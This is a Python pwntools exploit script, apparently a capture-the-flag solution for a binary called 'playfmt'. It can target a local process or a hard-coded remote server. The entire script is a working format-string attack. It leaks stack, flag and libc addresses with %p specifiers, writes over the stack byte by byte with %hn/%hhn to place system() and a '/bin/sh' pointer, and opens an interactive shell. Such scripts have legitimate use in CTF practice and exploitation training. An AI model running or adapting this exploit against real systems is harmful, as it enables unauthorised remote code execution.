#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hal <edit py/.vimrc to change me>

from pwn import *
context.log_level="debug"
pwn_file="./playfmt"
elf=ELF(pwn_file)
libc=ELF("./bc.so.6")
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("120.78.192.35", 9999)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

r.recvuntil("Server")
r.recvuntil("=====================\n")
r.sendline("%6$p")
stack = int(r.recvline().strip(), 16) - 0x38
info("stack: " + hex(stack))

r.sendline("%19$p")
flag = int(r.recvline().strip(), 16) - 0x2a8
info("flag: " + hex(flag))

r.sendline("%12$p")
a = int(r.recvline().strip(), 16) - 0x1b0d60
libc.address = a
info("libc: " + hex(a))

def my_write(addr, data):
    for i in range(4):
        if i == 0:
            sh = '%' + str((addr)&0xffff) + 'c%6$hnxxxx\x00'
        else:
            sh = '%' + str((addr+i)&0xff) + 'c%6$hhnxxxx\x00'
        r.sendline(sh)
        r.recvuntil("xxxx")
        info("len = "+str(len(data)))
        info("data = "+ data.encode("hex") )
        info("changing: "+data[i].encode("hex"))
        a = ord(data[i])
        if a == 0:
            a = 256
        sh = '%' + str(a) + 'c%14$hhnxxxx\x00'
        r.sendline(sh)
        r.recvuntil("xxxx")

my_write(stack+0x1c, p32(libc.sym['system']))
my_write(stack+0x24, p32(libc.search("/bin/sh").next()))

r.sendline("quit\x00")

r.interactive()
